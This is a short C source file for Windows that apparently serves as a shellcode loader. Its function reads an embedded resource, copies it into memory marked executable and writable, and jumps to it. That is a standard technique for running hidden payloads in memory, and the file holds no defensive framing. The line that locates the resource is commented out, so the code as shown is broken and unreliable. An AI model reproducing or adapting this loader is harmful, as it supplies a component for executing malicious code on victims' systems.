#include <stdio.h>
#include <Windows.h>

VOID RunFromPeResources()
{
	HRSRC shellcodeResource = NULL;

	// shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_MEM_BIN1), L"MEM_BIN");
	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);

	void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcodeResouceData, shellcodeSize);
	((void(*)())exec)();

}